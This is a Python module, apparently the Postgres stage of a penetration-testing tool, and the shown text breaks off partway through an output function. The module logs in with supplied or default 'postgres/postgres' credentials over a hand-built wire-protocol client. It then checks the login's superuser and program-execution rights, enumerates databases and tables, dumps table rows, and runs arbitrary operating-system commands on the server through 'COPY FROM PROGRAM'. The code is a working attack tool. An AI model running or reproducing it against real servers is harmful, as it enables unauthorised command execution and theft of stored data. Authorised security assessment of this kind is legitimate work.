"""Postgres audit stage."""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import os
import re
import secrets
import socket
import sys
import time
from collections.abc import Callable
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from typing import Any

from .console import Console
from .logger import AttemptLogger
from .utils import collect_scan_ports, collect_scan_targets, utc_now_iso

_PG_PROTOCOL_VERSION = 196608
_PG_MAX_MESSAGE_SIZE = 16 * 1024 * 1024
_PG_HANDSHAKE_TYPES = {b"R", b"S", b"K", b"Z", b"E", b"N"}
_PG_IDENT_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_$]*$")


class _PgAuditError(Exception):
    def __init__(
        self,
        message: str,
        *,
        detected: bool = False,
        auth_required: bool | None = None,
        auth_method: str | None = None,
        sqlstate: str | None = None,
    ) -> None:
        super().__init__(message)
        self.detected = detected
        self.auth_required = auth_required
        self.auth_method = auth_method
        self.sqlstate = sqlstate


@dataclass
class _PgSession:
    auth_required: bool
    auth_method: str | None
    server_version: str | None


@dataclass
class _ScramState:
    client_first_bare: str
    client_nonce: str
    expected_server_signature: str | None = None


def _clip(text: str, width: int = 64) -> str:
    if len(text) <= width:
        return text
    if width <= 3:
        return text[:width]
    return text[: width - 3] + "..."


def _retry_delay(attempt_index: int) -> float:
    return min(1.50, 0.20 * (2**attempt_index))


def _recv_exact(sock: socket.socket, size: int) -> bytes:
    data = b""
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk:
            raise ConnectionError("unexpected EOF")
        data += chunk
    return data


def _pg_send_message(sock: socket.socket, message_type: bytes, payload: bytes) -> None:
    sock.sendall(message_type + (len(payload) + 4).to_bytes(4, "big") + payload)


def _pg_read_message(sock: socket.socket) -> tuple[bytes, bytes]:
    header = _recv_exact(sock, 5)
    message_type = header[:1]
    length = int.from_bytes(header[1:5], "big")
    if length < 4 or length > _PG_MAX_MESSAGE_SIZE:
        raise ValueError(f"invalid postgres message length: {length}")
    payload = _recv_exact(sock, length - 4)
    return message_type, payload


def _pg_send_startup(sock: socket.socket, username: str, database: str) -> None:
    user_raw = username.encode("utf-8", errors="replace")
    database_raw = database.encode("utf-8", errors="replace")
    body = (
        _PG_PROTOCOL_VERSION.to_bytes(4, "big")
        + b"user\x00"
        + user_raw
        + b"\x00"
        + b"database\x00"
        + database_raw
        + b"\x00"
        + b"client_encoding\x00UTF8\x00"
        + b"application_name\x00redposture\x00"
        + b"\x00"
    )
    sock.sendall((len(body) + 4).to_bytes(4, "big") + body)


def _pg_send_password(sock: socket.socket, password: str) -> None:
    _pg_send_message(sock, b"p", password.encode("utf-8", errors="replace") + b"\x00")


def _pg_send_sasl_initial(sock: socket.socket, mechanism: str, initial_response: str) -> None:
    mechanism_raw = mechanism.encode("utf-8", errors="replace")
    initial_raw = initial_response.encode("utf-8", errors="replace")
    payload = mechanism_raw + b"\x00" + len(initial_raw).to_bytes(4, "big") + initial_raw
    _pg_send_message(sock, b"p", payload)


def _pg_send_sasl_response(sock: socket.socket, response: str) -> None:
    _pg_send_message(sock, b"p", response.encode("utf-8", errors="replace"))


def _pg_send_query(sock: socket.socket, query: str) -> None:
    _pg_send_message(sock, b"Q", query.encode("utf-8", errors="replace") + b"\x00")


def _pg_send_terminate(sock: socket.socket) -> None:
    _pg_send_message(sock, b"X", b"")


def _pg_parse_error(payload: bytes) -> tuple[str | None, str]:
    sqlstate: str | None = None
    message: str | None = None
    idx = 0
    while idx < len(payload):
        key = payload[idx : idx + 1]
        idx += 1
        if key == b"\x00":
            break
        end = payload.find(b"\x00", idx)
        if end < 0:
            break
        value = payload[idx:end].decode("utf-8", errors="replace")
        idx = end + 1
        if key == b"C":
            sqlstate = value
        elif key == b"M":
            message = value
    return sqlstate, message or "postgres error"


def _pg_parse_parameter_status(payload: bytes) -> tuple[str | None, str | None]:
    try:
        key_raw, rest = payload.split(b"\x00", 1)
        value_raw, _ = rest.split(b"\x00", 1)
    except ValueError:
        return None, None
    return key_raw.decode("utf-8", errors="replace"), value_raw.decode("utf-8", errors="replace")


def _pg_parse_data_row(payload: bytes) -> list[str | None]:
    if len(payload) < 2:
        raise ValueError("invalid DataRow payload")
    columns = int.from_bytes(payload[0:2], "big")
    idx = 2
    row: list[str | None] = []
    for _ in range(columns):
        if idx + 4 > len(payload):
            raise ValueError("truncated DataRow payload")
        size = int.from_bytes(payload[idx : idx + 4], "big", signed=True)
        idx += 4
        if size == -1:
            row.append(None)
            continue
        if size < 0 or idx + size > len(payload):
            raise ValueError("invalid DataRow value length")
        row.append(payload[idx : idx + size].decode("utf-8", errors="replace"))
        idx += size
    return row


def _pg_query_rows(sock: socket.socket, query: str) -> tuple[list[list[str | None]], str | None]:
    rows: list[list[str | None]] = []
    error: str | None = None

    _pg_send_query(sock, query)
    while True:
        message_type, payload = _pg_read_message(sock)
        if message_type == b"D":
            rows.append(_pg_parse_data_row(payload))
            continue
        if message_type == b"E":
            _, error = _pg_parse_error(payload)
            continue
        if message_type == b"Z":
            return rows, error


def _parse_bool(value: str | None) -> bool | None:
    if value is None:
        return None
    normalized = value.strip().lower()
    if normalized in {"t", "true", "on", "1", "yes"}:
        return True
    if normalized in {"f", "false", "off", "0", "no"}:
        return False
    return None


def _pg_query_scalar_bool(sock: socket.socket, query: str) -> tuple[bool | None, str | None]:
    rows, error = _pg_query_rows(sock, query)
    if error:
        return None, error
    if not rows or not rows[0]:
        return None, "empty query result"
    value = _parse_bool(rows[0][0])
    if value is None:
        return None, f"invalid boolean value: {rows[0][0]}"
    return value, None


def _pg_query_scalar_int(sock: socket.socket, query: str) -> tuple[int | None, str | None]:
    rows, error = _pg_query_rows(sock, query)
    if error:
        return None, error
    if not rows or not rows[0]:
        return None, "empty query result"
    raw = rows[0][0]
    if raw is None:
        return None, "empty integer value"
    try:
        return int(raw), None
    except ValueError:
        return None, f"invalid integer value: {raw}"


def _escape_scram_username(username: str) -> str:
    return username.replace("=", "=3D").replace(",", "=2C")


def _parse_scram_fields(message: str) -> dict[str, str]:
    fields: dict[str, str] = {}
    for part in message.split(","):
        if "=" not in part:
            continue
        key, value = part.split("=", 1)
        fields[key] = value
    return fields


def _scram_client_first(username: str) -> tuple[_ScramState, str]:
    nonce = base64.b64encode(secrets.token_bytes(18)).decode("ascii")
    first_bare = f"n={_escape_scram_username(username)},r={nonce}"
    return _ScramState(client_first_bare=first_bare, client_nonce=nonce), f"n,,{first_bare}"


def _scram_client_final(state: _ScramState, password: str, server_first: str) -> tuple[str, str]:
    fields = _parse_scram_fields(server_first)
    nonce = fields.get("r")
    salt_b64 = fields.get("s")
    iterations_raw = fields.get("i")
    if not nonce or not salt_b64 or not iterations_raw:
        raise _PgAuditError("invalid SCRAM challenge", detected=True, auth_required=True, auth_method="scram-sha-256")
    if not nonce.startswith(state.client_nonce):
        raise _PgAuditError("SCRAM nonce mismatch", detected=True, auth_required=True, auth_method="scram-sha-256")

    try:
        iterations = int(iterations_raw)
    except ValueError as exc:
        raise _PgAuditError(
            "invalid SCRAM iterations",
            detected=True,
            auth_required=True,
            auth_method="scram-sha-256",
        ) from exc

    try:
        salt = base64.b64decode(salt_b64.encode("ascii"), validate=True)
    except Exception as exc:
        raise _PgAuditError(
            "invalid SCRAM salt",
            detected=True,
            auth_required=True,
            auth_method="scram-sha-256",
        ) from exc

    salted_password = hashlib.pbkdf2_hmac("sha256", password.encode("utf-8", errors="replace"), salt, iterations)
    client_key = hmac.new(salted_password, b"Client Key", hashlib.sha256).digest()
    stored_key = hashlib.sha256(client_key).digest()

    client_final_without_proof = f"c=biws,r={nonce}"
    auth_message = f"{state.client_first_bare},{server_first},{client_final_without_proof}"

    client_signature = hmac.new(stored_key, auth_message.encode("utf-8", errors="replace"), hashlib.sha256).digest()
    proof_bytes = bytes(left ^ right for left, right in zip(client_key, client_signature, strict=True))
    proof = base64.b64encode(proof_bytes).decode("ascii")

    server_key = hmac.new(salted_password, b"Server Key", hashlib.sha256).digest()
    server_signature = base64.b64encode(
        hmac.new(server_key, auth_message.encode("utf-8", errors="replace"), hashlib.sha256).digest()
    ).decode("ascii")

    final_message = f"{client_final_without_proof},p={proof}"
    return final_message, server_signature


def _scram_verify_server_final(state: _ScramState, server_final: str) -> None:
    fields = _parse_scram_fields(server_final)
    if "e" in fields:
        raise _PgAuditError(
            f"SCRAM server error: {fields['e']}",
            detected=True,
            auth_required=True,
            auth_method="scram-sha-256",
        )
    if state.expected_server_signature is None:
        raise _PgAuditError(
            "SCRAM state missing expected server signature",
            detected=True,
            auth_required=True,
            auth_method="scram-sha-256",
        )
    server_signature = fields.get("v")
    if server_signature != state.expected_server_signature:
        raise _PgAuditError(
            "SCRAM server signature mismatch",
            detected=True,
            auth_required=True,
            auth_method="scram-sha-256",
        )


def _pg_md5_password(username: str, password: str, salt: bytes) -> str:
    inner = hashlib.md5((password + username).encode("utf-8", errors="replace")).hexdigest().encode("ascii")
    outer = hashlib.md5(inner + salt).hexdigest()
    return f"md5{outer}"


def _parse_sasl_mechanisms(payload: bytes) -> list[str]:
    result: list[str] = []
    for chunk in payload.split(b"\x00"):
        if not chunk:
            continue
        result.append(chunk.decode("utf-8", errors="replace"))
    return result


def _pg_startup_and_auth(sock: socket.socket, username: str, password: str | None, database: str) -> _PgSession:
    _pg_send_startup(sock, username=username, database=database)

    detected = False
    authenticated = False
    auth_required = False
    auth_method: str | None = None
    server_version: str | None = None
    scram_state: _ScramState | None = None

    while True:
        message_type, payload = _pg_read_message(sock)
        if not detected and message_type not in _PG_HANDSHAKE_TYPES:
            raise _PgAuditError(f"unexpected response prefix: {message_type!r}", detected=False)

        if message_type == b"R":
            detected = True
            if len(payload) < 4:
                raise _PgAuditError("invalid authentication payload", detected=True)
            auth_code = int.from_bytes(payload[0:4], "big")

            if auth_code == 0:
                authenticated = True
                continue

            if auth_code == 3:
                auth_required = True
                auth_method = "cleartext"
                if password is None:
                    raise _PgAuditError(
                        "password authentication required",
                        detected=True,
                        auth_required=True,
                        auth_method=auth_method,
                    )
                _pg_send_password(sock, password)
                continue

            if auth_code == 5:
                auth_required = True
                auth_method = "md5"
                if len(payload) < 8:
                    raise _PgAuditError(
                        "invalid MD5 authentication payload",
                        detected=True,
                        auth_required=True,
                        auth_method=auth_method,
                    )
                if password is None:
                    raise _PgAuditError(
                        "md5 authentication required",
                        detected=True,
                        auth_required=True,
                        auth_method=auth_method,
                    )
                _pg_send_password(sock, _pg_md5_password(username, password, payload[4:8]))
                continue

            if auth_code == 10:
                auth_required = True
                auth_method = "scram-sha-256"
                if password is None:
                    raise _PgAuditError(
                        "SCRAM authentication required",
                        detected=True,
                        auth_required=True,
                        auth_method=auth_method,
                    )
                mechanisms = _parse_sasl_mechanisms(payload[4:])
                if "SCRAM-SHA-256" not in mechanisms:
                    raise _PgAuditError(
                        f"unsupported SASL mechanisms: {','.join(mechanisms) or '-'}",
                        detected=True,
                        auth_required=True,
                        auth_method=auth_method,
                    )
                scram_state, client_first = _scram_client_first(username)
                _pg_send_sasl_initial(sock, "SCRAM-SHA-256", client_first)
                continue

            if auth_code == 11:
                auth_required = True
                auth_method = "scram-sha-256"
                if scram_state is None:
                    raise _PgAuditError(
                        "unexpected SCRAM continue",
                        detected=True,
                        auth_required=True,
                        auth_method=auth_method,
                    )
                server_first = payload[4:].decode("utf-8", errors="replace")
                final_message, expected_signature = _scram_client_final(scram_state, password or "", server_first)
                scram_state.expected_server_signature = expected_signature
                _pg_send_sasl_response(sock, final_message)
                continue

            if auth_code == 12:
                auth_required = True
                auth_method = "scram-sha-256"
                if scram_state is None:
                    raise _PgAuditError(
                        "unexpected SCRAM final",
                        detected=True,
                        auth_required=True,
                        auth_method=auth_method,
                    )
                server_final = payload[4:].decode("utf-8", errors="replace")
                _scram_verify_server_final(scram_state, server_final)
                continue

            raise _PgAuditError(
                f"unsupported auth method: {auth_code}",
                detected=True,
                auth_required=True,
            )

        if message_type == b"S":
            detected = True
            key, value = _pg_parse_parameter_status(payload)
            if key == "server_version":
                server_version = value
            continue

        if message_type in {b"K", b"N"}:
            detected = True
            continue

        if message_type == b"E":
            detected = True
            sqlstate, message = _pg_parse_error(payload)
            auth_hint = auth_required
            if sqlstate in {"28P01", "28000"}:
                auth_hint = True
            if "password authentication failed" in message.lower():
                auth_hint = True
            raise _PgAuditError(
                message,
                detected=True,
                auth_required=auth_hint,
                auth_method=auth_method,
                sqlstate=sqlstate,
            )

        if message_type == b"Z":
            detected = True
            if not authenticated:
                authenticated = True
            return _PgSession(auth_required=auth_required, auth_method=auth_method, server_version=server_version)

        raise _PgAuditError(f"unexpected handshake message: {message_type!r}", detected=detected)


def _collect_postgres_privileges(
    sock: socket.socket,
) -> tuple[bool | None, bool | None, bool | None, int | None, str | None]:
    superuser, superuser_error = _pg_query_scalar_bool(
        sock,
        "SELECT COALESCE((SELECT rolsuper FROM pg_roles WHERE rolname = current_user), false)",
    )

    can_program, can_program_error = _pg_query_scalar_bool(
        sock,
        (
            "SELECT CASE "
            "WHEN EXISTS (SELECT 1 FROM pg_roles WHERE rolname = 'pg_execute_server_program') "
            "THEN pg_has_role(current_user, 'pg_execute_server_program', 'MEMBER') "
            "ELSE false "
            "END"
        ),
    )

    readable_tables, readable_tables_error = _pg_query_scalar_int(
        sock,
        (
            "SELECT COUNT(*) "
            "FROM information_schema.tables "
            "WHERE table_schema NOT IN ('pg_catalog', 'information_schema') "
            "AND has_table_privilege(format('%I.%I', table_schema, table_name), 'SELECT')"
        ),
    )

    can_execute_commands: bool | None
    if superuser is None and can_program is None:
        can_execute_commands = None
    else:
        can_execute_commands = bool(superuser) or bool(can_program)

    can_read_tables: bool | None
    if readable_tables is None:
        can_read_tables = None
    else:
        can_read_tables = readable_tables > 0

    errors = [
        item
        for item in (
            superuser_error,
            can_program_error,
            readable_tables_error,
        )
        if item
    ]
    query_error = "; ".join(errors) if errors else None
    return superuser, can_execute_commands, can_read_tables, readable_tables, query_error


def _pg_query_readable_tables(sock: socket.socket) -> tuple[list[str] | None, str | None]:
    rows, error = _pg_query_rows(
        sock,
        (
            "SELECT table_schema, table_name "
            "FROM information_schema.tables "
            "WHERE table_schema NOT IN ('pg_catalog', 'information_schema') "
            "AND has_table_privilege(format('%I.%I', table_schema, table_name), 'SELECT') "
            "ORDER BY table_schema, table_name"
        ),
    )
    if error:
        return None, error

    tables: list[str] = []
    for row in rows:
        if len(row) < 2:
            continue
        schema = str(row[0] or "").strip()
        name = str(row[1] or "").strip()
        if not schema or not name:
            continue
        tables.append(f"{schema}.{name}")
    return tables, None


def _pg_query_databases(sock: socket.socket) -> tuple[list[str] | None, str | None]:
    rows, error = _pg_query_rows(
        sock,
        ("SELECT datname FROM pg_database WHERE datallowconn = true AND datistemplate = false ORDER BY datname"),
    )
    if error:
        return None, error

    databases: list[str] = []
    for row in rows:
        if not row:
            continue
        name = str(row[0] or "").strip()
        if name:
            databases.append(name)
    return databases, None


def _pg_quote_literal(value: str) -> str:
    return "'" + value.replace("'", "''") + "'"


def _pg_quote_ident(value: str) -> str:
    return '"' + value.replace('"', '""') + '"'


def _pg_normalize_table_name(raw_name: str) -> tuple[str | None, str | None, str | None]:
    candidate = (raw_name or "").strip()
    if not candidate:
        return None, None, "empty table name"

    parts = [part.strip() for part in candidate.split(".")]
    if len(parts) not in {1, 2}:
        return None, None, f"invalid table format: {candidate}"
    if any(not part for part in parts):
        return None, None, f"invalid table format: {candidate}"
    for part in parts:
        if not _PG_IDENT_RE.fullmatch(part):
            return None, None, f"unsupported table identifier: {candidate}"

    display = ".".join(parts)
    sql_ident = ".".join(_pg_quote_ident(part) for part in parts)
    return sql_ident, display, None


def _pg_normalize_column_names(raw_values: list[str]) -> tuple[list[str], str | None]:
    normalized: list[str] = []
    seen: set[str] = set()
    for raw_value in raw_values:
        for part in str(raw_value).split(","):
            name = part.strip()
            if not name:
                continue
            if not _PG_IDENT_RE.fullmatch(name):
                return [], f"unsupported column identifier: {name}"
            if name in seen:
                continue
            seen.add(name)
            normalized.append(name)
    return normalized, None


def _pg_text(value: Any) -> str:
    return str(value if value is not None else "").replace("\n", "\\n")


def _pg_try_execute_command(
    sock: socket.socket, command: str, *, max_lines: int = 100
) -> tuple[list[str] | None, str | None]:
    temp_name = f"redposture_exec_{secrets.token_hex(6)}"
    temp_ident = f'"{temp_name}"'

    _, create_error = _pg_query_rows(sock, f"CREATE TEMP TABLE {temp_ident} (line text)")
    if create_error:
        return None, create_error

    _, copy_error = _pg_query_rows(sock, f"COPY {temp_ident} FROM PROGRAM {_pg_quote_literal(command)}")
    if copy_error:
        _pg_query_rows(sock, f"DROP TABLE IF EXISTS {temp_ident}")
        return None, copy_error

    rows, select_error = _pg_query_rows(sock, f"SELECT line FROM {temp_ident} LIMIT {max(1, int(max_lines))}")
    _pg_query_rows(sock, f"DROP TABLE IF EXISTS {temp_ident}")
    if select_error:
        return None, select_error

    lines: list[str] = []
    for row in rows:
        if not row:
            continue
        lines.append(_pg_text(row[0]))
    return lines, None


def _pg_execute_remote_command(
    host: str,
    port: int,
    timeout: float,
    retries: int,
    username: str,
    password: str | None,
    database: str,
    command: str,
) -> tuple[list[str] | None, str | None]:
    attempts = max(1, retries + 1)
    last_error: str | None = None
    for attempt in range(attempts):
        sock: socket.socket | None = None
        try:
            sock = socket.create_connection((host, port), timeout=timeout)
            sock.settimeout(timeout)
            _pg_startup_and_auth(sock, username=username, password=password, database=database)
            output, exec_error = _pg_try_execute_command(sock, command, max_lines=500)
            try:
                _pg_send_terminate(sock)
            except Exception:
                pass
            return output, exec_error
        except _PgAuditError as exc:
            return None, str(exc)
        except (OSError, ValueError, ConnectionError) as exc:
            last_error = str(exc)
            if attempt >= attempts - 1:
                break
            time.sleep(_retry_delay(attempt))
        finally:
            if sock is not None:
                try:
                    sock.close()
                except OSError:
                    pass
    return None, last_error or "connection failed"


def _pg_query_table_rows(
    sock: socket.socket,
    table_name: str,
    *,
    columns: list[str] | None = None,
    max_rows: int = 100,
) -> tuple[str, list[str] | None, str | None]:
    sql_ident, display_name, normalize_error = _pg_normalize_table_name(table_name)
    if normalize_error or sql_ident is None or display_name is None:
        return (table_name or "").strip() or "<invalid>", None, normalize_error or "invalid table name"

    limit = max(1, int(max_rows))
    if columns:
        select_list = ", ".join(_pg_quote_ident(column) for column in columns)
    else:
        select_list = "*"
    rows, error = _pg_query_rows(
        sock, f"SELECT row_to_json(t)::text FROM (SELECT {select_list} FROM {sql_ident} LIMIT {limit}) AS t"
    )
    if error:
        return display_name, None, error

    values: list[str] = []
    for row in rows:
        if not row:
            continue
        values.append(_pg_text(row[0]))
    return display_name, values, None


def _pg_query_table_columns(
    sock: socket.socket,
    table_name: str,
    *,
    only_columns: list[str] | None = None,
) -> tuple[str, list[str] | None, str | None]:
    _, display_name, normalize_error = _pg_normalize_table_name(table_name)
    if normalize_error or display_name is None:
        return (table_name or "").strip() or "<invalid>", None, normalize_error or "invalid table name"

    rows, error = _pg_query_rows(
        sock,
        (
            "SELECT a.attname "
            "FROM pg_attribute a "
            f"WHERE a.attrelid = to_regclass({_pg_quote_literal(display_name)}) "
            "AND a.attnum > 0 "
            "AND NOT a.attisdropped "
            "ORDER BY a.attnum"
        ),
    )
    if error:
        return display_name, None, error

    columns: list[str] = []
    for row in rows:
        if not row:
            continue
        value = str(row[0] or "").strip()
        if value:
            columns.append(value)
    if not columns:
        return display_name, None, "table not found or no visible columns"

    if only_columns:
        selected = set(only_columns)
        columns = [column for column in columns if column in selected]
        if not columns:
            return display_name, None, "no matching columns"

    return display_name, columns, None


def _audit_postgres_host(
    host: str,
    port: int,
    timeout: float,
    retries: int,
    username: str | None,
    password: str | None,
    defcreds: bool,
    database: str,
    show_databases: bool,
    show_tables: bool,
    show_columns: bool,
    table_targets: list[str],
    table_columns: list[str],
    dump_table_rows: bool,
    execute_command: str | None,
) -> dict[str, Any]:
    attempts = max(1, retries + 1)
    last_error: str | None = None

    provided_credentials = password is not None or username is not None
    if provided_credentials:
        effective_username = (username or "postgres").strip() or "postgres"
        effective_password = password
    elif defcreds:
        effective_username = "postgres"
        effective_password = "postgres"
    else:
        effective_username = "postgres"
        effective_password = None

    for attempt in range(attempts):
        started = time.monotonic()
        try:
            with socket.create_connection((host, port), timeout=timeout) as sock:
                sock.settimeout(timeout)

                session = _pg_startup_and_auth(
                    sock,
                    username=effective_username,
                    password=effective_password,
                    database=database,
                )

                superuser, can_execute_commands, can_read_tables, readable_tables, query_error = (
                    _collect_postgres_privileges(sock)
                )
                database_names: list[str] | None = None
                if show_databases:
                    database_names, databases_error = _pg_query_databases(sock)
                    if databases_error:
                        if query_error:
                            query_error = f"{query_error}; {databases_error}"
                        else:
                            query_error = databases_error
                table_names: list[str] | None = None
                if (show_tables or (dump_table_rows and not table_targets)) and can_read_tables is True:
                    table_names, table_error = _pg_query_readable_tables(sock)
                    if table_error:
                        if query_error:
                            query_error = f"{query_error}; {table_error}"
                        else:
                            query_error = table_error

                table_columns_info: list[dict[str, Any]] = []
                table_dumps: list[dict[str, Any]] = []
                dump_targets: list[str] = table_targets if table_targets else (table_names or [])
                should_collect_table_columns = bool(table_targets) and (show_columns or not dump_table_rows)
                if should_collect_table_columns:
                    for table_name in table_targets:
                        columns_table, columns_rows, columns_error = _pg_query_table_columns(
                            sock,
                            table_name,
                            only_columns=table_columns if table_columns else None,
                        )
                        table_columns_info.append(
                            {
                                "table": columns_table,
                                "columns": columns_rows,
                                "error": columns_error,
                            }
                        )

                if dump_table_rows:
                    for table_name in dump_targets:
                        dump_table, dump_rows, dump_error = _pg_query_table_rows(
                            sock,
                            table_name,
                            columns=table_columns if table_columns else None,
                        )
                        table_dumps.append(
                            {
                                "table": dump_table,
                                "rows": dump_rows,
                                "error": dump_error,
                            }
                        )

                execute_attempted = False
                execute_ok: bool | None = None
                execute_output: list[str] | None = None
                execute_error: str | None = None
                if execute_command:
                    execute_attempted = True
                    execute_output, execute_error = _pg_try_execute_command(sock, execute_command)
                    execute_ok = execute_error is None

                try:
                    _pg_send_terminate(sock)
                except Exception:
                    pass

                if session.auth_required is False:
                    status = "open_no_auth"
                elif provided_credentials:
                    status = "valid_credentials"
                elif defcreds:
                    status = "weak_default_creds"
                else:
                    status = "auth_required"

                return {
                    "timestamp": utc_now_iso(),
                    "host": host,
                    "port": port,
                    "database": database,
                    "is_postgres": True,
                    "status": status,
                    "auth_required": session.auth_required,
                    "auth_method": session.auth_method,
                    "provided_credentials": provided_credentials,
                    "provided_username": username,
                    "provided_password": password if provided_credentials else None,
                    "defcreds_enabled": defcreds,
                    "effective_username": effective_username,
                    "show_databases": show_databases,
                    "database_names": database_names,
                    "show_tables": show_tables,
                    "show_columns": show_columns,
                    "table_names": table_names,
                    "table_targets": dump_targets if dump_table_rows and not table_targets else table_targets,
                    "table_columns": table_columns,
                    "table_dump_enabled": dump_table_rows,
                    "table_columns_info": table_columns_info,
                    "table_dumps": table_dumps,
                    "execute_command": execute_command,
                    "execute_attempted": execute_attempted,
                    "execute_ok": execute_ok,
                    "execute_output": execute_output,
                    "execute_error": execute_error,
                    "server_version": session.server_version,
                    "superuser": superuser,
                    "can_execute_commands": can_execute_commands,
                    "can_read_tables": can_read_tables,
                    "readable_tables": readable_tables,
                    "elapsed_ms": int((time.monotonic() - started) * 1000),
                    "error": query_error,
                }

        except _PgAuditError as exc:
            return {
                "timestamp": utc_now_iso(),
                "host": host,
                "port": port,
                "database": database,
                "is_postgres": bool(exc.detected),
                "status": "auth_required" if exc.detected and exc.auth_required else "fail",
                "auth_required": exc.auth_required,
                "auth_method": exc.auth_method,
                "provided_credentials": provided_credentials,
                "provided_username": username,
                "provided_password": password if provided_credentials else None,
                "defcreds_enabled": defcreds,
                "effective_username": effective_username,
                "show_databases": show_databases,
                "database_names": None,
                "show_tables": show_tables,
                "show_columns": show_columns,
                "table_names": None,
                "table_targets": table_targets,
                "table_columns": table_columns,
                "table_dump_enabled": dump_table_rows,
                "table_columns_info": [],
                "table_dumps": [],
                "execute_command": execute_command,
                "execute_attempted": False,
                "execute_ok": None,
                "execute_output": None,
                "execute_error": None,
                "server_version": None,
                "superuser": None,
                "can_execute_commands": None,
                "can_read_tables": None,
                "readable_tables": None,
                "elapsed_ms": int((time.monotonic() - started) * 1000),
                "error": str(exc),
            }

        except (OSError, ValueError, ConnectionError) as exc:
            last_error = str(exc)
            if attempt >= attempts - 1:
                break
            time.sleep(_retry_delay(attempt))

    return {
        "timestamp": utc_now_iso(),
        "host": host,
        "port": port,
        "database": database,
        "is_postgres": False,
        "status": "fail",
        "auth_required": None,
        "auth_method": None,
        "provided_credentials": provided_credentials,
        "provided_username": username,
        "provided_password": password if provided_credentials else None,
        "defcreds_enabled": defcreds,
        "effective_username": effective_username,
        "show_databases": show_databases,
        "database_names": None,
        "show_tables": show_tables,
        "show_columns": show_columns,
        "table_names": None,
        "table_targets": table_targets,
        "table_columns": table_columns,
        "table_dump_enabled": dump_table_rows,
        "table_columns_info": [],
        "table_dumps": [],
        "execute_command": execute_command,
        "execute_attempted": False,
        "execute_ok": None,
        "execute_output": None,
        "execute_error": None,
        "server_version": None,
        "superuser": None,
        "can_execute_commands": None,
        "can_read_tables": None,
        "readable_tables": None,
        "elapsed_ms": None,
        "error": last_error or "connection failed",
    }


def _nxc_prefix(record: dict[str, Any]) -> str:
    host = _clip(str(record.get("host") or "-"), 64)
    port = str(record.get("port") or "-")
    return f"{'POSTGRES':<8}\t{host}\t{port}\t"


def _caps_suffix(record: dict[str, Any]) -> str:
    superuser = record.get("superuser")
    can_execute_commands = record.get("can_execute_commands")
    can_read_tables = record.get("can_read_tables")
    readable_tables = record.get("readable_tables")

    superuser_text = "True" if superuser is True else "False" if superuser is False else "unknown"
    execute_text = "True" if can_execute_commands is True else "False" if can_execute_commands is False else "unknown"
    read_tables_text = "True" if can_read_tables is True else "False" if can_read_tables is False else "unknown"
    tables_text = str(readable_tables) if isinstance(readable_tables, int) else "-"

    return f"(superuser:{superuser_text})(execute:{execute_text})(read:{read_tables_text})(tables:{tables_text})"


def _format_detect_record(record: dict[str, Any], output_format: str) -> str:
    auth_required = record.get("auth_required")
    auth_required_text = "True" if auth_required is True else "False" if auth_required is False else "unknown"

    if output_format == "json":
        return json.dumps(
            {
                "timestamp": record.get("timestamp"),
                "type": "detect",
                "host": record.get("host"),
                "port": record.get("port"),
                "service": "postgres",
                "detected": bool(record.get("is_postgres")),
                "auth_required": auth_required,
                "auth_method": record.get("auth_method"),
            },
            ensure_ascii=False,
        )

    return f"{_nxc_prefix(record)} [*] Postgres Database (auth required:{auth_required_text})"


def _format_tables_detail_records(record: dict[str, Any], output_format: str) -> list[str]:
    if not record.get("show_tables"):
        return []

    table_names = record.get("table_names")
    if not isinstance(table_names, list):
        return []

    if output_format == "json":
        return [
            json.dumps(
                {
                    "timestamp": record.get("timestamp"),
                    "type": "tables_dump",
                    "service": "postgres",
                    "host": record.get("host"),
                    "port": record.get("port"),
                    "database": record.get("database"),
                    "table_count": len(table_names),
                    "tables": [str(item) for item in table_names],
                },
                ensure_ascii=False,
            )
        ]

    prefix = _nxc_prefix(record)
    lines = [f"{prefix} [*] Dump Tables"]
    for table_name in table_names:
        lines.append(f"{prefix} {str(table_name)}")
    return lines


def _format_databases_detail_records(record: dict[str, Any], output_format: str) -> list[str]:
    if not record.get("show_databases"):
        return []

    database_names = record.get("database_names")
    if not isinstance(database_names, list):
        return []

    if output_format == "json":
        return [
            json.dumps(
                {
                    "timestamp": record.get("timestamp"),
                    "type": "databases_dump",
                    "service": "postgres",
                    "host": record.get("host"),
                    "port": record.get("port"),
                    "database": record.get("database"),
                    "database_count": len(database_names),
                    "databases": [str(item) for item in database_names],
                },
                ensure_ascii=False,
            )
        ]

    prefix = _nxc_prefix(record)
    lines = [f"{prefix} [*] Dump Databases"]
    for database_name in database_names:
        lines.append(f"{prefix} {str(database_name)}")
    return lines


def _format_table_columns_detail_records(record: dict[str, Any], output_format: str) -> list[str]:
    table_columns_info = record.get("table_columns_info")
    if not isinstance(table_columns_info, list) or not table_columns_info:
        return []

    if output_format == "json":
        lines: list[str] = []
        for item in table_columns_info:
            if not isinstance(item, dict):
                continue
            lines.append(
                json.dumps(
                    {
                        "timestamp": record.get("timestamp"),
                        "type": "table_columns",
                        "service": "postgres",
                        "host": record.get("host"),
                        "port": record.get("port"),
                        "database": record.get("database"),
                        "table": str(item.get("table") or ""),
                        "columns": [str(column) for column in item.get("columns") or []],
                        "error": str(item.get("error")) if item.get("error") else None,
                    },
                    ensure_ascii=False,
                )
            )
        return lines

    prefix = _nxc_prefix(record)
    lines: list[str] = []
    for item in table_columns_info:
        if not isinstance(item, dict):
            continue
        table_name = str(item.get("table") or "").strip() or "<unknown>"
        lines.append(f"{prefix} [*] Table Columns {table_name}")
        column_error = item.get("error")
        if column_error:
            lines.append(f"{prefix} <error:{_pg_text(column_error)}>")
            continue
        columns = item.get("columns")
        if isinstance(columns, list) and columns:
            for column_name in columns:
                lines.append(f"{prefix} {str(column_name)}")
        else:
            lines.append(f"{prefix} <no columns>")
    return lines


def _format_table_dump_detail_records(record: dict[str, Any], output_format: str) -> list[str]:
    if not record.get("table_dump_enabled"):
        return []
    table_dumps = record.get("table_dumps")
    if not isinstance(table_dumps, list) or not table_dumps:
        return []
    table_columns = record.get("table_columns")
    selected_columns = (
        [str(item) for item in table_columns] if isinstance(table_columns, list) and table_columns else []
    )
    columns_label = ",".join(selected_columns)

    if output_format == "json":
        lines: list[str] = []
        for item in table_dumps:
            if not isinstance(item, dict):
                continue
            table_name = str(item.get("table") or "")
            lines.append(
                json.dumps(
                    {
                        "timestamp": record.get("timestamp"),
                        "type": "table_dump",
                        "service": "postgres",
                        "host": record.get("host"),
                        "port": record.get("port"),
